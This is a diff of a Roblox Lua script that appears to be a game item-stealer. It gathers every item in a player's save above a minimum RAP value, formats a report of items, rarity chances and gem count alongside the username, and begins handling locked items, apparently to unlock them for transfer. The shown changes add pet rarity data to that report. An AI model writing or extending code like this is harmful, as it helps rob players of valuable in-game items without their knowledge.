@@ -69,7 +69,7 @@ local function SendMessage(username, diamonds)
         if itemRapMap[rapKey] then
             itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
         else
-            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
+            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
             table.insert(combinedItems, rapKey)
         end
     end
@@ -80,7 +80,11 @@ local function SendMessage(username, diamonds)
 
     for _, itemName in ipairs(combinedItems) do
         local itemData = itemRapMap[itemName]
-        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+        if itemData.chance then
+            fields[2].value = fields[2].value .. "1/" .. formatNumber(itemData.chance) .. " " .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+        else
+            fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+        end
     end
 
     fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
@@ -209,10 +213,19 @@ local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
 for i, v in pairs(categoryList) do
 	if save[v] ~= nil then
 		for uid, item in pairs(save[v]) do
-            local rapValue = getRAP(v, item)
-            if rapValue >= min_rap then
-                table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
-                totalRAP = totalRAP + (rapValue * (item._am or 1))
+            if v == "Pet" then
+                local rapValue = getRAP(v, item)
+                if rapValue >= min_rap then
+                    local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
+                    totalRAP = totalRAP + (rapValue * (item._am or 1))
+                end
+            else
+                local rapValue = getRAP(v, item)
+                if rapValue >= min_rap then
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+                    totalRAP = totalRAP + (rapValue * (item._am or 1))
+                end
             end
             if item._lk then
                 local args = {
